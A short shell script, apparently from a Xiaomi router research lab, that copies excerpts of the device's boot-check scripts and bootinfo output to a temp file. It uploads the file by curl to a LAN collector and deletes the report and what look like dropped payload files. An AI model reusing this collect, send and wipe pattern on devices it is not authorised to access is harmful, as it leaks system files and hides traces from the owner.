#!/bin/sh
# SOLA LETTURA: estratti degli script stock che gestiscono i flag di avvio.
umask 077
report=/tmp/xiaomi-lab-boot-logic.txt
{
echo '=== /usr/sbin/bootinfo ==='; cat /usr/sbin/bootinfo
echo '=== /usr/sbin/boot_check 100-170 ==='; sed -n '100,170p' /usr/sbin/boot_check
echo '=== /lib/preinit/90_mount_bind_etc 80-140 ==='; sed -n '80,140p' /lib/preinit/90_mount_bind_etc
echo '=== /etc/init.d/key_services_boot_check 25-60 ==='; sed -n '25,60p' /etc/init.d/key_services_boot_check
echo '=== bootinfo output ==='; /usr/sbin/bootinfo 2>&1 | head -20
} > "$report" 2>&1
curl --noproxy '*' -f -s --connect-timeout 3 --max-time 20 --data-binary @"$report" http://192.168.31.222:18080/inventory >/dev/null
rm -f "$report" /tmp/script.sh /tmp/speedtest_urls.xml
